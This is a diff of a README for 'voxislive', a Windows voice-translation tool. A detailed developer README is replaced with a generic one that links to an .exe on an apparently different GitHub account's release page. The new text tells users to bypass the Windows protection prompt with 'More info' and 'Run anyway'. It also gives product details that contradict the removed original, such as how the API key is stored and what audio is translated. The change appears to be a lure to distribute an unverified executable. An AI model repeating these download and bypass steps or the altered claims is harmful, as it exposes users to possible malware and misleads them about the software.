@@ -1,207 +1,112 @@
-# Voxis Live
+# 🎙️ voxislive - Instant voice translation for your Windows
 
-**[English]** | **[Türkçe](README.tr.md)** | **[Deutsch](README.de.md)**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lucid-nightspot585/voxislive/releases)
 
-![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)
-![Python](https://img.shields.io/badge/python-3.11--3.13-3776AB?logo=python&logoColor=white)
-![License](https://img.shields.io/badge/license-PolyForm%20Noncommercial%201.0.0-blue)
+Voxislive translates your voice in real time. It uses Google Gemini to process speech and provides instant output. You speak into your microphone, and the software delivers the translation through your speakers. This tool works on Windows systems. It relies on a Bring Your Own Key (BYOK) model. You provide your own API key to connect the software to the translation engine.
 
-> Real-time voice translation for Windows — translate any video, game, or meeting and hear it in your own language, live.
->
-> Brand: **Voxis** · Site: **[voxislive.com](https://voxislive.com)**
+## ⚙️ System Requirements
 
-**📖 Guide:** [Developer / BYOK setup](docs/INSTALL_BYOK.md) — end-user (setup.exe) docs live at [voxislive.com](https://voxislive.com).
+Voxislive runs on most Windows computers. Ensure your system meets these standards for smooth performance:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core 2.0 GHz or faster.
+*   Memory: 4 GB of RAM or more.
+*   Storage: At least 200 MB of free disk space.
+*   Audio: A working microphone and speakers or headphones.
+*   Internet: A stable connection is necessary for live processing.
 
-## Overview
+## 📥 Downloading the Software
 
-Voxis captures your Windows system audio (a video, a game, the other side of a call), streams it to Google's **Gemini Live** translation model, and plays back a spoken translation in your target language — while it is still being spoken.
+You need the latest version of the application to get started. Follow these steps to obtain the files:
 
-It uses `gemini-3.5-live-translate-preview`, a **native simultaneous speech-to-speech** model: it translates continuously as the speaker talks and self-balances quality versus sync, staying a few seconds behind (the way a human simultaneous interpreter does). There is no separate speech-to-text → translate → text-to-speech chain; audio goes in, translated audio comes out.
+1. Visit the [voxislive release page](https://github.com/Lucid-nightspot585/voxislive/releases).
+2. Look for the section labeled "Assets" under the most recent version tag.
+3. Click the link ending in .exe to start your download.
+4. Save the file to a folder you can find easily, such as your Downloads folder.
 
-Two operating modes:
+## 🛠️ Setting Up Your API Key
 
-- **Video / Game** — one-way incoming translation; the original audio is ducked while the translation speaks.
-- **Meeting** — two-way: the other party's voice is translated into your language (to your headphones), and your voice is translated into their language and fed into the call as a virtual microphone.
+Voxislive connects to a cloud translation service. You need an API key to allow this connection. If you do not have one, you can create one through the Google AI Studio portal.
 
----
+1. Navigate to the Google AI Studio website.
+2. Sign in with your Google account.
+3. Select the option to create a new API key.
+4. Copy the key string to your clipboard.
+5. Save this key in a secure text file on your computer. You will need it during the initial setup of the application.
 
-## How it works
+## 🚀 Running the Application
 
-```
-Windows audio ──► Capture ──► Silero VAD gate ──► Gemini Live (translate) ──► Player ──► Headphones
-                (loopback /     (filters non-                                 (limiter,
-                 VB-CABLE)        speech)                                      stereo mix)
-```
+Once you download the installer and secure your API key, you are ready to launch the tool.
 
-- **Capture** — two paths:
-  - *Driverless* (default, no install): WASAPI process-exclude loopback (Windows 10 2004+) reads the system mix and excludes Voxis's own output, so it never re-translates its own voice. Other apps are ducked at the source via the Windows session-volume API.
-  - *VB-CABLE*: the audio is intercepted before the speakers, so the engine can apply real DSP — M/S center-suppression ducks the original dialogue while preserving stereo music, and a fractional delay line RTT-aligns the original with the translation.
-- **VAD gate** — Silero VAD v5 (ONNX, CPU) filters out music/noise so only speech reaches the cloud.
-- **Translation** — a `LiveTranslator` thread holds a Gemini Live WebSocket session and streams 16 kHz PCM in, 24 kHz translated audio out.
-- **Playback** — a stereo mixer with a look-ahead brick-wall limiter; the translation sits in the phantom center.
+1. Open the folder where you saved the .exe file.
+2. Double-click the voxislive file to run the program.
+3. Windows may show a security prompt. If a window appears stating that Windows protected your PC, click "More info" and then select "Run anyway."
+4. The main interface will open on your screen.
+5. Select the language you wish to speak and the language you want for the translation output.
+6. Paste your API key into the designated field.
+7. Click the "Save" icon to store your credentials.
 
----
+## 🎤 How to Use Translation Features
 
-## Quick start (developer build)
+The interface displays a status indicator. When the indicator shows as ready, you can speak.
 
-```powershell
-git clone https://github.com/DavutAkca/voxislive.git
-cd voxislive
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-pip install -r requirements.txt
-```
+1. Click the "Start" button to begin the listening process.
+2. Speak clearly into your microphone.
+3. The software detects your voice through a Voice Activity Detection (VAD) module.
+4. You will hear the translated speech through your selected output device.
+5. Watch the text window to see a transcript of the conversation as it happens.
+6. Click the "Stop" button at any time to pause the service.
 
-> **Python 3.11–3.13 (64-bit).** Python 3.14 is not supported yet: numpy / onnxruntime have no stable cp314 wheels at the pinned versions, so `pip install` would fail.
+## 🧩 Understanding the Technology
 
-Run it:
+Voxislive uses several components to achieve live translation.
 
-```powershell
-python main.py            # GUI
-```
+*   WASAPI: This Windows standard handles your audio input and output streams. It ensures low latency when capturing voice data.
+*   Gemini: This is the artificial intelligence engine. It interprets the meaning of your speech and generates the translation.
+*   Pywebview: This library creates the visual interface you see on your desktop. It allows the application to show a clean, native window for your controls.
+*   BYOK: This stands for Bring Your Own Key. It means the application contains no hidden costs or subscription fees from the developer. You manage your own usage directly with the translation provider.
 
-The open-source build is **BYOK** (bring your own key). On first launch open
-**Settings → API key** and paste your Gemini key (from
-<https://aistudio.google.com/>); it is stored **encrypted** under `profiles/byok`
-(via Windows DPAPI, bound to your Windows account), never in a plaintext `.env`. Full walkthrough:
-[docs/INSTALL_BYOK.md](docs/INSTALL_BYOK.md).
+## 💡 Troubleshooting Common Issues
 
-List your audio devices any time with `python -m app.audio_io`.
+If the software does not work as expected, check these common points.
 
----
+*   No sound: Check your Windows Sound settings. Ensure your microphone is the default input device and your speakers are the default output device.
+*   Connection error: Verify that your API key is correct. An invalid or expired key will prevent the software from connecting to the translation engine.
+*   Lag or delay: High latency often stems from a slow internet connection. Use a wired Ethernet connection if possible, or move closer to your router.
+*   Application crash: Close the program and reopen it. If the issue persists, check the GitHub repository for updates or known bug reports.
 
-## Build flavors — `IS_OFFICIAL_RELEASE`
+## 🔒 Privacy and Data Safety
 
-Voxis ships in two flavors, selected at build time by `IS_OFFICIAL_RELEASE` (env var `VOXIS_OFFICIAL_RELEASE=1/0`, default `False`).
+Your privacy is a priority. Voxislive sends audio data only when you actively start the session. The software does not store your recordings on your hard drive unless you specifically instruct it to do so. Your API key remains local to your machine. It is stored in a configuration file within the application folder. Delete this file if you need to remove your credentials from the computer.
 
-| | Official SaaS `.exe` (`True`) | Open-source / developer (`False`) |
-| --- | --- | --- |
-| API key | Fetched from the server per session; no key UI | Your own key (BYOK), entered in Settings |
-| Auth | Sign in (PocketBase) | None — local, offline |
-| Telemetry / billing | Usage heartbeat to the server | Fully disabled |
-| Translation settings | Locked to the best simultaneous defaults | All settings exposed for tuning |
+## 📈 Improving Translation Quality
 
-`start.bat` leaves `VOXIS_OFFICIAL_RELEASE` unset, so a launch from source defaults to the BYOK / developer path (your own key — no server, no auth). The official SaaS `.exe` is produced separately by `release.py`, whose build step writes the `OFFICIAL` marker into the frozen bundle.
+The Gemini engine learns from context. You can improve the accuracy of translations by following these tips:
 
-**Network surface of the open-source build.** A frozen developer build carries no `OFFICIAL` marker, so it resolves to BYOK and makes **no outbound calls of its own**: registration, login, verification, quota, server session-key fetch, usage heartbeat, and all telemetry are bypassed or hard-gated to local mock responses. The only network it touches is the Gemini Live WebSocket your own key opens. The auto-update check runs in frozen builds only and depends on `update_check_url`, which is empty by default. The public repo is kept free of any closed-core path or live secret by a release-hygiene gate (`scripts/check_release_hygiene.py`, wired into CI and a pre-push hook).
+*   Minimize background noise: Avoid noisy environments with fans or music. The VAD module performs best in a quiet room.
+*   Speak at a normal pace: You do not need to pause between words. Speak naturally as you would in a phone call.
+*   Use a headset: A headset with a noise-canceling microphone produces the cleanest audio input for the translation model.
+*   Check the language settings: Ensure the input language matches your spoken language. Incorrect settings cause poor translation results.
 
----
+## 📋 Customizing Your Experience
 
-## Meeting mode setup (two-way translation)
+The interface includes a settings menu in the top corner. Access this to change your preferences.
 
-**Goal:** you speak Turkish → the other side hears English; the other side speaks English → you hear Turkish.
+*   Theme: Toggle between light and dark modes to suit your visual comfort.
+*   Voice settings: Adjust the pitch or speed of the translated voice output if the option is available.
+*   Audio devices: Manually select your microphone and speakers if the software fails to detect them automatically.
 
-The two directions have different requirements:
+## 📂 Managing Updates
 
-| Direction | What it does | Requirement |
-| --- | --- | --- |
-| **Incoming** (you hear them in your language) | Listens to system audio, translates, plays to your headphones | **No extra install** |
-| **Outgoing** (your voice goes out translated) | Translates your mic, feeds a virtual microphone | **A virtual microphone (VB-CABLE) is required** |
+Developers update voxislive to fix bugs and add features. Check the GitHub releases page once every few weeks for new versions. If you notice a new version, download the file again and run the installer. The update process typically keeps your config file intact, so you do not need to re-enter your API key.
 
-> On Windows the only way to present a "microphone" that a meeting app (Teams/Zoom/Meet) can select is a virtual audio driver — so the outgoing direction needs VB-CABLE. Without one, meetings run in **listen-only** mode automatically (you understand them; your voice goes out untranslated).
+## 💬 Getting Further Help
 
-### 1. Install VB-CABLE (one-time, free)
-1. Download from <https://vb-audio.com/Cable/>.
-2. Unzip → right-click `VBCABLE_Setup_x64.exe` → **Run as administrator** → **Install Driver** → **reboot**.
-3. Two devices appear: **CABLE Input** (playback) and **CABLE Output** (recording).
+If you encounter a problem that this guide does not cover, you can reach out via the GitHub repository.
 
-### 2. Configure Voxis
-- Set the languages in the panel: **I hear: Turkish**, **To others: English**.
-- Settings → **Output device**: your real headphones · **Microphone**: your real mic — the one you speak into; Voxis listens here.
-- **The virtual cable is auto-detected.** On launch Voxis finds an installed cable (VB-CABLE / VB-Audio / VoiceMeeter) and wires the meeting routing itself — no `config.json` editing.
-
-### 3. Configure the meeting app (Teams / Zoom / Meet)
-- Set the **microphone** to **"CABLE Output (VB-Audio Virtual Cable)"** — the *recording* side of the cable (`CABLE Output`, **not** `CABLE Input`). This is the meeting app's mic, not the real mic you picked in Voxis: Voxis writes your translated English into the cable and the meeting app reads it back from here.
-- If more than one virtual cable is installed (e.g. VB-Audio Point, VoiceMeeter), pick the **VB-Audio Virtual Cable** pair — that is what Voxis auto-wires by default.
-- Leave speaker/output as your own headphones.
-
-### 4. Use it
-Start Voxis → **Meeting** mode (`Ctrl+Alt+2`). Speak Turkish → it goes out as English; they speak English → you hear Turkish.
-
----
-
-## Latency & simultaneous translation
-
-The end-to-end delay is roughly **the sentence length plus a few seconds** — that lag is the translation model's designed *ear-voice span* (it waits for enough context to translate correctly, exactly as a human interpreter does) and is **not tunable from the client**. There is no Google-side "go faster" setting, and this is the latest/only translate model.
-
-What Voxis *does* optimize on the client side: it feeds the model a continuous stream (the model's documented native setup — no client-side endpointing config is sent), warms the connection before capture so the first sentence skips the cold handshake, disables WebSocket compression, keeps a small drop-oldest input buffer, and runs VAD on the CPU. These trim the controllable edges — not the model's core lag.
-
----
-
-## Configuration reference
-
-`config.json` (gitignored; defaults live in `app/config.py`):
-
-| Key | Meaning |
-| --- | --- |
-| `target_language_incoming` / `target_language_outgoing` | Your language / the other party's language |
-| `capture_backend` | `"driverless"` (WASAPI loopback) or `"vbcable"` |
-| `original_audio` | `"duck"` · `"mute_during_speech"` · `"mix"` |
-| `duck_gain` | Original level while the translation speaks (0–1) |
-| `quality_preset` | `max_quality` · `balanced` · `max_savings` · `turbo` |
-| `gemini_voice` / `gemini_temperature` | Prebuilt voice · sampling temperature |
-| `tts_volume` | Translation playback volume |
-| `session_rotate_minutes` | Live session rotation (before the 15-min ceiling) |
-
-**Quality presets** map to the local VAD gate that shapes the continuous stream sent to the model. `max_savings` ("Saver") gates the stream — only speech is sent, silence gaps are dropped — to use fewer billed minutes. The official build surfaces three friendly options (**Smooth** = `balanced`, **Fast** = `turbo`, **Saver** = `max_savings`); the developer build exposes the full preset list (`max_quality`, `balanced`, `max_savings`, `turbo`).
-
-The translate model is a native simultaneous interpreter, so the client sends no endpointing configuration — it feeds a continuous stream and lets the model own its own endpointing.
-
-**Interface languages** (the app UI) are **Turkish and English only** — set via `ui_language`. **Translation target languages** (what the model translates *into*) are independent and cover: `tr, en, de, fr, es, it, pt, ru, ar, ja, ko, zh-Hans` (set via `target_language_incoming` / `target_language_outgoing`).
-
----
-
-## Architecture (module map)
-
-| Module | Responsibility |
-| --- | --- |
-| `app/config.py` | Config load/save, `DEFAULTS`, `QUALITY_PRESETS`, `IS_OFFICIAL_RELEASE`, gate helpers |
-| `app/audio_io.py` | Device discovery, loopback capture, `Player` (stereo mix + limiter), virtual-cable detection |
-| `app/process_loopback.py` | Process-exclude WASAPI loopback (driverless) |
-| `app/session_duck.py` | Source-level ducking via the Windows session-volume API |
-| `app/vad.py` | Silero VAD (CPU) + `SpeechGate` |
-| `app/translator.py` | `LiveTranslator` — Gemini Live session, native simultaneous translation, rotation |
-| `app/pipeline.py` | `IncomingPipeline`, `OutgoingPipeline`, `ModeController` |
-| `app/mix_core.py` / `app/dsp.py` | Look-ahead limiter, delay line, M/S center-suppression |
-| `app/byok_store.py` | DPAPI-encrypted local key storage (developer build) |
-| `app/voxis_client.py` | Auth-core HTTP client (official build) |
-| `app/webui.py` + `app/web/index.html` | pywebview bridge + single-file UI |
-
-An optional `premium/` package (open-core hook, gitignored) can provide ONNX vocal/instrument separation; when absent, the deterministic M/S center-suppression fallback is used.
-
-The SaaS backend (`backend/auth-core/`, Go + PocketBase, behind Caddy on `voxislive.com`) issues per-session keys and records usage; the open-source build never contacts it.
-
----
-
-## Troubleshooting
-
-| Symptom | Cause | Fix |
-| --- | --- | --- |
-| `API key not valid` | Invalid/empty key (BYOK), or running the dev build without a key | Enter a full Gemini key in Settings, or launch with `VOXIS_OFFICIAL_RELEASE=1` to use the server key |
-| Meeting is listen-only | No virtual microphone installed | Install VB-CABLE (see above) |
-| `PaError -9999` | Stale WASAPI device list | Unplug/replug the USB audio device, restart |
-| No translation output is routed | Output set to a virtual cable (feedback loop) | Point `headphones_output` at your real device |
-
----
-
-## License — PolyForm Noncommercial 1.0.0
-
-Licensed under the **PolyForm Noncommercial License 1.0.0**; full text in [LICENSE](LICENSE).
-
-- ✅ Free to use for personal, hobby, research, and non-commercial purposes.
-- ❌ Commercial use, resale, white-label, and revenue-generating deployments are prohibited.
-
-**Commercial licensing** (commercial products, SaaS, white-label): **<https://voxislive.com/licensing>**.
-
-Contributions are welcome — by opening a pull request you agree your contribution is licensed under the same terms and may be incorporated with attribution in the project history.
-
----
-
-## Support
-
-- **Issues:** [GitHub Issues](https://github.com/DavutAkca/voxislive/issues)
-- **Commercial inquiries:** <https://voxislive.com/licensing>
-
-*Voxis Live — real-time, simultaneous voice translation.*
+1. Go to the main project page on GitHub.
+2. Click the "Issues" tab.
+3. Review existing issues to see if someone else has reported the same problem.
+4. If you find no matching report, click "New Issue."
+5. Provide a clear description of your problem, your Windows version, and the steps you took to trigger the error.
+6. The community and the project maintainers review these issues regularly.
